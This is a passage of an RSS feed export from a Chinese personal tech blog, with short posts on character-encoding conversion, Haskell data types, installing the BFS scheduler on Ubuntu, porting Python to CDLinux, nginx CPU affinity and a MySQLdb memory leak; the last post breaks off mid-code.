<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GBK</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">同时包含简体和繁体编码，也就是说同一个字，由于编码不同，在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GBK</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码下属于两个字。有时候，为了正确取得完整的结果，应该将繁体和简体进行统一。可以考虑将</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">、</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GBK</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中的所有繁体字，转换为相应的简体字，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">BIG5</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码的数据，也应该转化成相应的简体字。当然，仍旧以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码存储。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　例如，对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">语言</SPAN><FONT face="Times New Roman"> </FONT><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">語言</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">表示为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"xE8xAFxADxE8xA8x80 xE8xAAx9ExE8xA8x80"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，进行简繁体编码转换后应该是两个相同的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman"> "xE8xAFxADxE8xA8x80&gt;"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832224617161/</guid>
    </item>
    <item>
      <title>
<![CDATA[WPF进度控件]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009103102151361/</link>
      <description>
<![CDATA[在进行网络连接或数据库查询是，往往需要等待一段时间，在这段时间里，最好显示一个进度条之类的东西，给用户一种后台操作正在进行的感觉。<br>一般的实现思路是增加一个线程，但是实验时，可能是窗口切换没有做好之类原因，最后没有成功。<br>CodeProject 上提供了一套不错的思路，使用WPF的StoryBoard，详见：<br>http://www.codeproject.com/KB/WPF/wpfprogressringcontrol.aspx]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009103102151361/</guid>
    </item>
    <item>
      <title>
<![CDATA[一切皆有可能：php访问Java, django支持wiki]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720099222455290/</link>
      <description>
<![CDATA[<br>从php-java-bridge_5.5.4_documentation.zip里解压缩出JavaBridge.war  <br>在php中使用java使用：<br>  &lt;php? require_on<wbr>ce(<a target="_blank" rel="nofollow" href="http://127.0.0.1:8080/JavaBridge/java/Java.inc"  >http://127.0.0.1:8080/JavaBridge/java/Java.inc</a>); ?&gt;<br>   $date=new Java('java.util.Date');<br>  echo $date-&gt;getDate();<br>  ?&gt;<br><br> http://github.com/sneeu/django-wiki&nbsp; download&nbsp; <br> 拷贝 django-wiki 解压包到django项目下<br> vim setting.py<br>INSTALLED_APPS=(<br>&nbsp;&nbsp;&nbsp; ...<br>&nbsp;&nbsp;&nbsp; 'sitename.wiki',<br>)<br> vim urls.py<br>urlpatterns=patterns('',<br>&nbsp;&nbsp;&nbsp; (r'^wiki/', include('wiki.urls')),<br>)<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720099222455290/</guid>
    </item>
    <item>
      <title>
<![CDATA[ubuntu安装BFS ]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720099167346575/</link>
      <description>
<![CDATA[什么是BFS？<br>BFS是Brain Fuck Scheduler的缩写，是大牛ck对Linux的CPU调度优化patch，据说打上这个patch，系统会很快、很快、很快。。。<br><br>如何在Ubuntu中用BFS？<br>实际上，Ubuntu直到9.10尚未提供BFS的包，但是某位牛人做了一个，据说可能会加入10.04中，现在如果你的Ubuntu版本是是9.10Karmic Koala，就可以体验到底有多快了。<br>sudo echo "deb <a rel="nofollow" href="http://ppa.launchpad.net/darxus/bfs/ubuntu">http://ppa.launchpad.net/darxus/bfs/ubuntu</a> karmic main" &gt;&gt; /etc/apt/<p>sources.list<br>
sudo aptitude update<br>
sudo aptitude install linux-bfs linux-bfs-headers-generic</p>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720099167346575/</guid>
    </item>
    <item>
      <title>
<![CDATA[Haskell的数据类型]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010111372444396/</link>
      <description>
<![CDATA[程序＝数据＋算法，要学习一门语言，就必须先了解它的数据类型，Haskell的数据类型主要分四类：<br>基本类型，Tuple，List，自定义类型。<br>基本类型分两部分，一部分是Int Char Bool Float之类的基本类型，另一部分是这些类型的分类，这些类型的分类会在Haskell的函数部分涉及。<br>Tuple是最简单的部分，只要记住fst和snd就可以了<br>List是最强大也是最复杂的类型，也是要重点掌握的类型，很多操作都是基于List的特性的。<br>自定义类型<br><wbr><b>基本类型</b><br>Haskell的基本类型有：Char Bool Int Integer Float Double，可以使用命令:t查看数据类型，这和python的type 关键字很像，如<br>Prelude&gt; :t 3<br>3 :: (Num t) =&gt; t<br>Prelude&gt; :t 'h'<br>'h' :: Char<br>Prelude&gt; :t "hello"<br>"hello" :: [Char]<br>Prelude&gt; :t [1,2,3]<br>[1,2,3] :: (Num t) =&gt; [t]<br>1. Int 是数字<br>2. Integer也是数字，但是Integer可以表示大数。这和Java的Integer一样<br>3. Float是单精度浮点数<br>4. Double是双精度浮点数<br>5. Bool 是布尔值, True和False<br>6. Char 是字符<br>类型类，这个一般出现在函数的定义中，在后面<br>1. Ord 有序的类型<br>2. Show 可显示的<br>3. Read<br>4. Enum<br>5. Bounded<br>6. Num 数值类型，整数和小数<br>7. Integral 数值类型，整数<br>8. Floating 数值类型，小数<br><br><b>元组Tuple</b><br>1.元组是两个元素组成的结构，和Python的tuple一样，有两个操作元组的函数fst和snd，分别取元组的第一和第二个元素。<br>let hjz=(3,4)<br>fst hjz<br>snd hjz<br>let x=(4,5)<br>2.元组可以比较，只要类型相对匹配<br>hjz&lt;x<br>3.元组的两个元素类型可以不同<br>let hjz=([1,2], 'h')<br><br><b>列表List</b><br>列表是Haskell的一个重要类型，相关操作也特别多<br>[1,2,3,4]<br>1. 列表合并 ++ 与 :。列表与列表合并用++，列表中加入元素用:<br>Prelude&gt; [1,2,3,4]++[5,6,7,8]<br>[1,2,3,4,5,6,7,8]<br>Prelude&gt; 5:[1,2,3,4]<br>[5,1,2,3,4]<br>2. 列表下标!!<br>[1,2,3,4]的第2个元素<br>Prelude&gt; [1,2,3,4] !! 2<br>3. 子集: head(第一个元素) last(最后一个元素) tail(除去第一个元素的子集) init(除去最后一个元素的子集) <br>Prelude&gt; let hjz=[1,2,3,4]<br>Prelude&gt; head hjz<br>1<br>Prelude&gt; last hjz<br>4<br>Prelude&gt; tail hjz<br>[2,3,4]<br>Prelude&gt; init hjz<br>[1,2,3]<br>4. 常用操作: length(长度) null(是否为空) reverse(反转) take(头部子集) drop(尾部子集) minimum(最小值) maximum(最大值) sum(连加总和) product(连乘总积) elem(是否是集合的元素)<br>Prelude&gt; length(hjz)<br>4<br>Prelude&gt; null(hjz)<br>False<br>Prelude&gt; null([])<br>True<br>Prelude&gt; reverse(hjz)<br>[4,3,2,1]<br>Prelude&gt; take 2 (hjz)<br>[1,2]<br>Prelude&gt; drop 1 (hjz)<br>[2,3,4]<br>Prelude&gt; minimum(hjz)<br>1<br>Prelude&gt; maximum(hjz)<br>4<br>Prelude&gt; sum(hjz)<br>10<br>Prelude&gt; product(hjz)<br>24<br>Prelude&gt; 3 `elem` hjz<br>True<br>Prelude&gt; 5 `elem` hjz<br>False<br>5. 有序子集<br>从1到10的整数集合 [1..10], 从1到10的奇数集合[1,3..10]<br>6. 表达式<br><img title="Haskell的数据类型 - hankjin - 云水居" src="data:image/png;base64,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" alt=""><br>Prelude&gt; [x*2 | x&lt;-[1..10]]<br>[2,4,6,8,10,12,14,16,18,20]<br>Prelude&gt; [x*y | x&lt;- [2,5,10], y&lt;- [8,10,11], x*y&gt; 50]<br>[55,80,100,110]<br><br><b>自定义类型</b><br>定义一个类型要用data关键字，例如要定义一个形状的类型<br>一个形状可能是圆形和矩形，<br>圆形有三个参数：中心的x坐标，中心的y坐标，半径长<br>矩形有四个参数：左上角的x坐标，左上角的y坐标，右下角的x坐标,右下角的y坐标。<br>然后就可以定义计算形状的表面面积的函数surface，如下所示：<br>$ cat &gt; type.hs &lt;&lt;EOF<br><span><span>data</span><span>&nbsp;</span><span>Shape</span><span>&nbsp;=&nbsp;</span><span>Circle</span><span>&nbsp;</span><span>Float</span><span>&nbsp;</span><span>Float</span><span>&nbsp;</span><span>Float</span><span>&nbsp;|&nbsp;</span><span>Rectangle</span><span>&nbsp;</span><span>Float</span><span>&nbsp;</span><span>Float</span><span>&nbsp;</span><span>Float</span><span>&nbsp;</span><span>Float<br>surface :: Shape -&gt; Float<br>surface (Circle _ _ r) = pi * r ^ 2 <br>surface (Rectangle x1 y1 x2 y2)=(abs $ x2-x1) * (abs $ y2-y1)</span><span><br>EOF<br>$ ghci<br>Prelude&gt; :l type<br>[1 of 1] Compiling Main&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ( type.hs, interpreted )<br>Ok, modules loaded: Main.<br>*Main&gt; surface $ Circle 10 20 10<br>314.15927<br>*Main&gt; surface $ Rectangle 0 0 100 100<br>10000.0<br>可读性更好的写法：<br></span></span><ol start="1"><li><span><span>data</span><span>&nbsp;</span><span>Person</span><span>&nbsp;=&nbsp;</span><span>Person</span><span>&nbsp;{&nbsp;firstName</span><span>&nbsp;::&nbsp;</span><span>String</span><span>&nbsp;&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,&nbsp;lastName<span>&nbsp;::&nbsp;</span><span>String</span><span>&nbsp;&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,&nbsp;age<span>&nbsp;::&nbsp;</span><span>Int</span><span>&nbsp;&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,&nbsp;height<span>&nbsp;::&nbsp;</span><span>Float</span><span>&nbsp;&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,&nbsp;phoneNumber<span>&nbsp;::&nbsp;</span><span>String</span><span>&nbsp;&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,&nbsp;flavor<span>&nbsp;::&nbsp;</span><span>String</span><span>&nbsp;&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<span>deriving</span><span>&nbsp;(</span><span>Show</span><span>)</span></span></li></ol><br><span><span><br></span></span>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010111372444396/</guid>
    </item>
    <item>
      <title>
<![CDATA[移植python到CDLinux 0.4.9]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200893110119989/</link>
      <description>
<![CDATA[<div >                              <ol><li>开发环境Slackware 8.1 + CDLinux0.49<br><span style="text-decoration: underline;"  ></span></li><li>步骤<ol><li>从Slackware8.1.iso获得python-2.2.tgz，传到CDLinux 0.4.9上<br></li><li>在CDLinux 0.4.9上解压缩python-2.2.tgz，然后运行，提示需要/lib/libpthread-0.9.so,/usr/lib/libssl.0.9.6.so,/usr/lib/libcrypto.0.9.6.so 从Slackware8.1系统中找到并传到CDLinux 0.4.9上，运行成功。  </li><li>因为python比较大，所以做成包会导致RAMDISK空间不够，所以要做成md格式。</li><li>创建目录md，解压缩python-2.2.tgz，并拷贝libpthread包  </li><li>创建.mount_point和.init文件</li><li>创建md文件 /sbin/mkfs.cramfs md python-2.2-cdl.md  </li><li>最终python-2.2-cdl.md可以从<a target="_blank" rel="nofollow" href="http://cbib.cnkk.org/wiki/attach/Cdlinux_md/python-2.2-cdl.md"  >这里下载</a></li></ol></li></ol><pre>#.mount_point<br>/usr/share/python<br></pre>  <pre>#.init<br>MyDir=`dirname $0`<br>ln -s $MyDir/usr/bin/python2.2 /bin/python<br>ln -s $MyDir/lib/libpthread-0.9.so /lib/libpthread.so.0<br>ln -s $MyDir/lib/libssl-0.9.6.so /lib/libssl.so.0<br>ln -s $MyDir/lib/libcrypto-0.9.6.so /lib/libcrypto.so.0<br><br></pre></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200893110119989/</guid>
    </item>
    <item>
      <title>
<![CDATA[[Q]nginx的CPU亲和性分配问题]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201082231523526/</link>
      <description>
<![CDATA[在nginx0.76中，启动工作进程时，可以指定cpu_affinity，但是奇怪的是，如果指定了m个cpu_affinity和n个工作进程，则在启动工作进程时，如果n&gt;m，则前m-1个工作进程的cpu_affinity与进程启动的序号相同，但最后n-m+1个工作进程全部用最后一个cpu_affinity。<br>简单些讲，将n个进程分配给m个CPU，按照这种分配方式，则会将m-1个进行分别分配给m-1个CPU，再把剩下的所有进程都分给最后一个CPU，为什么会这样呢？<br>一个比较合理的选择是第i个进程应该分配给第i%m个CPU，是nginx的bug?还是什么策略？还是我的理解错误呢？<br><br>源码如下：<br>os/unix/ngx_process_cycle.c的353与355行，分别获取和设置cpu_affinity.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cpu_affinity = ngx_get_cpu_affinity(i);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_spawn_process(cycle, ngx_worker_process_cycle, NULL,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "worker process", type);<br>追踪获取cpu_affinity的ngx_get_cpu_affinity函数，进入&nbsp; src/core/nginx.c 第1303-1319 行<br>u_long ngx_get_cpu_affinity(ngx_uint_t n)<br>{<br>&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp; if (ccf-&gt;cpu_affinity_n &gt; n) { <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ccf-&gt;cpu_affinity[n];<br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; return ccf-&gt;cpu_affinity[ccf-&gt;cpu_affinity_n - 1];<br>}<br>追踪设置cpu_affinity的ngx_spawn_process函数: 进入os/unix/ngx_process.c第83行和194行<br>ngx_pid_t ngx_spawn_process(ngx_cycle_t *cycle, ngx_spawn_proc_pt proc, void *data,<br>
&nbsp;&nbsp;&nbsp; char *name, ngx_int_t respawn) {<br>&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp; proc(cycle, data);<br>}<br>进入ngx_worker_process_cycle函数，src/os/unix/ngx_process_cycle.c的第710行和715行<br>static void ngx_worker_process_cycle(ngx_cycle_t *cycle, void *data) {<br>&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp; ngx_worker_process_init(cycle, 1);<br>}<br>进入ngx_worker_process_init，在src/os/unix/ngx_process_cycle.c的第821行和909行<br>static void ngx_worker_process_init(ngx_cycle_t *cycle, ngx_uint_t priority){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (sched_setaffinity(0, 32, (cpu_set_t *) &amp;cpu_affinity) == -1) {<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201082231523526/</guid>
    </item>
    <item>
      <title>
<![CDATA[观念的差异源于世界观，世界观的差异表现在政治经济文化观念上]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201083094352180/</link>
      <description>
<![CDATA[<span style="font-weight: bold;">一个网站的中国政治坐标测试：http://www.zuobiao.me/survey/index.php<br>感觉很多测试题的问法带有诱导的意味，测试出来的结果很简单，只有数字分数，没有解释，不过这么多负号，看来偶不是好人啊。<br><br>政治立场坐标<br>-0.8<br><br>文化立场坐标<br>-1.2<br><br>经济立场坐标<br>-0.3<br></span>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201083094352180/</guid>
    </item>
    <item>
      <title>
<![CDATA[两个好玩儿的Linux发行版]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200932942524656/</link>
      <description>
<![CDATA[一个做科学研究用的: Scientific Linux<br>https://www.scientificlinux.org/download/<br>一个游戏的: Linux-gamer<br>http://live.linux-gamers.net/<br><br>SL的截图:<br>SL-开始安装<br><a href="http://img.bimg.126.net/photo/_zKAkC9bTQJOjLT4g1jL4A==/4275323421258948726.jpg" target="_blank"><img title="两个好玩儿的Linux发行版 - hankjin - 乱-Blog" alt="两个好玩儿的Linux发行版 - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/_zKAkC9bTQJOjLT4g1jL4A==/4275323421258948726.jpg"></a><br>SL-登录界面<br><a href="http://img.bimg.126.net/photo/afhycYvVBhpNP8s5KRppYw==/2292050735356327869.jpg" target="_blank"><img title="两个好玩儿的Linux发行版 - hankjin - 乱-Blog" alt="两个好玩儿的Linux发行版 - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/afhycYvVBhpNP8s5KRppYw==/2292050735356327869.jpg"></a><br>SL-KDE桌面:<br><a href="http://img.bimg.126.net/photo/e6gCfICz90XdD46pIlUHow==/3420483916989391916.jpg" target="_blank"><img title="两个好玩儿的Linux发行版 - hankjin - 乱-Blog" alt="两个好玩儿的Linux发行版 - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/e6gCfICz90XdD46pIlUHow==/3420483916989391916.jpg"></a><br>SL-中文字体做的不错,不过越看越像RedHat,看到这里就是了<br><a href="http://img.bimg.126.net/photo/h6Fllh9qzc43DKH2-vCKLA==/4287145370280585332.jpg" target="_blank"><img title="两个好玩儿的Linux发行版 - hankjin - 乱-Blog" alt="两个好玩儿的Linux发行版 - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/h6Fllh9qzc43DKH2-vCKLA==/4287145370280585332.jpg"></a><br>GL截图:<br><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200932942524656/</guid>
    </item>
    <item>
      <title>
<![CDATA[Base64编码转换小工具]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078274515477/</link>
      <description>
<![CDATA[<P><A title="test.JPG" rel="nofollow" ></A></P>  <P>效果很不错，可以将普通编码编码base64；将base64编码的解回来；将中英文混排的文本中的中文编码为base64的，而英文保持不变。 <BR></P>  <TABLE cellSpacing="0" border="0" >  <TBODY>  <TR height="8" >  <TD></TD></TR>  <TR>  <TD vAlign="top" ><A target="_blank" rel="nofollow" href="http://blufiles.storage.live.com/y1pyHtVl8cq1A-tunX4m1LDZcaiKRHSMv63QDfnKA6J1n9kzGdIJL7Eg6jQd6bC93CWWrcYDfGAxRw" ><IMG title="Base64编码转换小工具 - hankjin - 云水居"  alt="Base64编码转换小工具 - hankjin - 云水居"  src="http://blufiles.storage.live.com/y1pyHtVl8cq1A-tunX4m1LDZcaiKRHSMv63xWwOcIAndshYOsHU3R9IpXE40QzHsSnkkqqpERbzXbg"  border="0" ></A></TD></TR></TABLE>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078274515477/</guid>
    </item>
    <item>
      <title>
<![CDATA[python连接mysql的MySQLdb内存泄露]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720105141191894/</link>
      <description>
<![CDATA[一个python程序，从内存读了一个5 000 000的数据集，然后将每个数据集的ID保存到一个set中，计算只要几十兆的内存，结果用了400多M，原来是MySQLdb的内存泄露问题。添加use_unicode=False参数之后，内存占用260M<br>环境：<br>Ubuntu 10.10 <br>MySQLdb建立数据库连接的时候，如果不用charset选项，没有问题，如果用了charset=utf8和use_unicode=False，也没问题，但是如果只用了charset='utf8'选项，就会有引起内存泄露的问题：<br>下面这段代码，运行后可以看到，该进程占用的内存明显地不断上升 <br>但是只要加上use_unicode=False或者去掉charset='utf8'(如注释所示)，就会发现占用的内存不再变化<br><br>#coding: utf8<br>import MySQLdb<br>import time,sys<br><br>def testdb():<br>&nbsp;&nbsp;&nbsp; while True:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; conn=MySQLdb.connect(host='localhost',user='xiaoneiu',passwd='xiaoneip',db='xiaonei',charset='utf8')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
